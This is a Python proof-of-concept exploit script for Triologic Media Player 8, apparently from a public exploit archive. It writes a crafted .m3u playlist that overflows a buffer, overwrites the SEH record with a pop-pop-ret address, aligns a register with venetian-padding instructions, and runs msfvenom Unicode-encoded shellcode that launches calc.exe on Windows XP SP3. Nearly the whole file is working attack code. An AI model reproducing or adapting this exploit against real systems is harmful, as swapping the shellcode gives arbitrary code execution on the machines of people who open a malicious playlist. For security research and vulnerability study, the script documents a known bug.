# Exploit for Triologic Media Player 8 - Unicode exploit - Calc
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.m3u", "wb")

alignment  = "\x55"                      # push EBP   
alignment += "\x71"                      # Venetian Padding
alignment += "\x58"                      # pop EAX
alignment += "\x71"                      # Venetian Padding
alignment += "\x05\x14\x11"              # add eax,0x11001400  \
alignment += "\x71"                      # Venetian Padding     |> +100
alignment += "\x2d\x13\x11"              # sub eax,0x11001300  /
alignment += "\x71"                      # Venetian Padding

jump  = "\x50"                           # push EAX
jump += "\x71"                           # Venetian Padding
jump += "\xc2"                           # RETN

padding = "B" * 109

# msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_mixed BufferRegister=EAX EXITFUNC=thread

shellcode_calc = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBylGxTBYpM0Ip30riJENQY0rD2kNp00dKb2LL4KObZtDKPrKxlO4w0JnFNQYo4loLpaSLirLlKpvaxOjmKQFgiRhrObaGdKr2lPbkMzMlrk0Ln1qhiS0HyqhQnqRkPYKpjaGcbka9N8YSMjOYtKLtdKza6vmaYoFLY18OZmyqewlxiPCEhvZcSMhxmkqmktSEXdqHBk28mT9qFsbFtKzlNk4KOhmLYqICBk9tbkM18PayQ4NDO41KOks1pYPZR19ok0qOqO0ZtKLRjK2mOm2JM1RmbeGBIpKPYppP0hP1tK0obgioWeukYPKmnJ9zS8fF4UwMuMYo6uMljf3LizSP9kgpbUiuGK0GZsT2bOOzipOckOvurC31pls3LnbEt8s5IpAA"

buffer  = "A" * 536
buffer += "\x61\x62"        # nseh
buffer += "\x59\x4a"        # 0x004a0059  : pop edi # pop esi # ret triomp8.exe
buffer += alignment
buffer += jump
buffer += padding
buffer += shellcode_calc
buffer += "C" * (5000-536-2-2-len(alignment+jump+padding+shellcode_calc))

file.write(buffer)
file.close()
